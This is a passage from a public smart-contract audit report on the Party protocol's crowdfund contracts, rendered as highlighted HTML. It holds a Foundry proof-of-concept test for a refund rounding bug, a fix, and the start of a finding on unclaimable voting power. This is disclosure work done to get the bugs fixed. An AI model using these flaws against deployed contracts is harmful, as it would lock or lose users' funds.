class=\"mtk12\">ether</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//contribute amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">member</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Contribute</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">contribute</span><span class=\"mtk1\">{ value: </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//crowdfund&#39;s balance = 1 ether - 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">7</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCrowdfundLifecycle</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">ETHCrowdfundBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">CrowdfundLifecycle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Lost</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Claim refund</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">refund</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//reverts as it tried to withdraw 1 ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When we subtract the fee in <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L227\">_processContribution()</a>, we should calculate the final amount using <code>1e4 - fundingSplitBps</code> directly. Then there will be 2 rounds down in <code>_processContribution()</code> and <code>_calculateRefundAmount</code> and the refund amount won’t be greater than the original amount.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">fundingSplitRecipient_</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> * (</span><span class=\"mtk7\">1e4</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/15#issuecomment-1515456122\">0xble (Party) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-04-reraiseethcrowdfundsol-multiple-scenarios-how-pending-votes-might-not-be-claimable-which-is-a-complete-loss-of-funds-for-a-user\" style=\"position:relative;\"><a href=\"#h-04-reraiseethcrowdfundsol-multiple-scenarios-how-pending-votes-might-not-be-claimable-which-is-a-complete-loss-of-funds-for-a-user\" aria-label=\"h 04 reraiseethcrowdfundsol multiple scenarios how pending votes might not be claimable which is a complete loss of funds for a user permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/13\">[H-04] <code>ReraiseETHCrowdfund.sol</code>: Multiple scenarios how pending votes might not be claimable which is a complete loss of funds for a user</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/13\">HollaDieWaldfee</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/24\">evan</a> and <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/17\">hansfriese</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L256-L303\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L256-L303</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L333-L382\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L333-L382</a></p>\n<p>This issue is about how the <a href=\"https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol\"><code>ReraiseETHCrowdfund</code></a> claim functionality can be broken.</p>\n<p>When the claim functionality is broken this means that a user cannot claim his voting power, resulting in a complete loss of funds.</p>\n<p>The claim functionality is not broken in any case, i.e. with any configuration of the <code>ReraiseETHCrowdfund</code> contract.</p>\n<p>However the contract can be configured in a way - and by configured I mean specifically the <code>minContribution</code>, <code>maxContribution</code>, <code>minTotalContributions</code> and <code>maxTotalContributions</code> variables - that the claim functionality breaks.</p>\n<p>And the configurations under which it breaks are NOT edge cases. They represent the <strong>intended use</strong> of the contract as discussed with the sponsor.</p>\n<p>The fact that when the contract is used as intended it can lead to a complete loss of funds for the users makes me estimate this to be “High” severity.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>We first need to understand the <code>claim(uint256 tokenId, address contributor)</code> and <code>claimMultiple(uint96[] memory votingPowerByCard, address contributor)</code> functions. They essentially make up the claim functionality as all other functions regarding claiming are just wrappers around them.</p>\n<p>Let’s first look at the <code>claim(uint256 tokenId, address contributor)</code> function. The first part of the function is what we are interested in:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L256-L283\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Check crowdfund lifecycle.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">CrowdfundLifecycle</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lc</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getCrowdfundLifecycle</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">lc</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">CrowdfundLifecycle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Finalized</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">WrongLifecycleError</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lc</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">pendingVotingPower</span><span class=\"mtk1\">[</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contribution</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">exchangeRateBps</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxContribution_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">maxContribution</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Check that the contribution equivalent of total pending voting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// power is not above the max contribution range. This can happen</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// for contributors who contributed multiple times In this case, the</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// `claimMultiple` function should be called instead. This is done</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// so parties may use the minimum and maximum contribution values to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// limit the voting power of each card (e.g.  a party desiring a &quot;1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// card = 1 vote&quot;-like governance system where each card has equal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// voting power).</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">contribution</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">maxContribution_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AboveMaximumContributionsError</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contribution</span><span class=\"mtk1\">, </span><span class=\"mtk12\">maxContribution_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>What is important is that <code>contribution</code> is calculatesd as:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contribution</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">exchangeRateBps</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>And then <code>contribution</code> is checked that it is <code>&#x3C;= maxContribution</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">contribution</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">maxContribution_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AboveMaximumContributionsError</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contribution</span><span class=\"mtk1\">, </span><span class=\"mtk12\">maxContribution_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The explanation for why this check is necessary can be seen in the comment:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"text\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// This is done</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// so parties may use the minimum and maximum contribution values to</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// limit the voting power of each card (e.g.  a party desiring a &quot;1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// card = 1 vote&quot;-like governance system where each card has equal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// voting power).</span></span></code></pre>\n<p>The <code>claimMultiple(uint96[] memory votingPowerByCard, address contributor)</code> function allows to divide the pending voting power across multiple party cards and it employs the following checks:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L352-L382\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minContribution_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minContribution</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxContribution_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">maxContribution</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">votingPowerByCard</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">votingPowerByCard</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Check that the contribution equivalent of voting power is within</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// contribution range. This is done so parties may use the minimum</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// and maximum contribution values to limit the voting power of each</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// card (e.g. a party desiring a &quot;1 card = 1 vote&quot;-like governance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// system where each card has equal voting power).</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contribution</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">votingPowerByCard</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] * </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">exchangeRateBps</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">contribution</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">minContribution_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BelowMinimumContributionsError</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contribution</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minContribution_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">contribution</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">maxContribution_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AboveMaximumContributionsError</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contribution</span><span class=\"mtk1\">, </span><span class=\"mtk12\">maxContribution_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">votingPowerByCard</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Mint contributor a new party card.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">votingPowerByCard</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Claimed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">votingPowerByCard</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Requires that all voting power is claimed because the contributor is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// expected to have burned their crowdfund NFT.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemainingVotingPowerAfterClaimError</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>We can see that for each party card the <code>contribution</code> needs to be <code>>= minContribution</code> and <code>&#x3C;= maxContribution</code>. Also the function must deal with all the voting power, so after the function call all pending voting power must be processed:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span 